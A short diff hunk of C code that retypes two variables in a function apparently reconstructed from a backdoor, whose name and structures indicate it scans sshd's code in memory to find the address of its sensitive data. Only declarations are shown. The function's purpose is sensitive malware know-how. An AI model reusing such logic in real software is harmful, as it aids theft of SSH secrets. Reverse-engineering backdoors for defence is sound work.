@@ -25,14 +25,14 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   long clear_idx;
   long hit_scan_idx;
   long hit_compare_idx;
-  long *hit_cursor;
+  u8 **hit_cursor;
   dasm_ctx_t *zero_ctx_cursor;
   u8 *store_operand_ptr;
   ulong hit_index;
   u8 hit_count;
   u8 tracked_reg;
   dasm_ctx_t store_probe_ctx;
-  long store_hits[16];
+  u8 *store_hits[16];
   
   *sensitive_data_out = (void *)0x0;
   xcalloc_call_target = (u8 *)string_refs->entries[0].func_start;
